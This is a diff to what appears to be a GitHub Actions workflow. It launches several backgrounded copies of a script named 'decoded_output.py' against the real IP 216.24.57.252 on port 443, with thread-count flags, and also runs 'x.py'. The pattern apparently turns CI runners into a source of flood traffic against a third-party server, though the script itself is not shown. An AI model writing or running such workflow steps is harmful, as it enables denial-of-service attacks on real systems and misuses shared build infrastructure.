@@ -29,7 +29,10 @@ jobs:
         run: pip install requests colorama
 
       - name: Start The Code
-        run: python decoded_output.py -s 216.24.57.252 -p 443 -t 700
+        run: python decoded_output.py -s 216.24.57.252 -p 443 -t 300 &
+      
+      - name: Start The Code
+        run: python decoded_output.py -s 216.24.57.252 -p 443 -t 300 & python decoded_output.py -s 216.24.57.252 -p 443 -t 300 &
       
       - name: Start The Code
         run: python x.py &
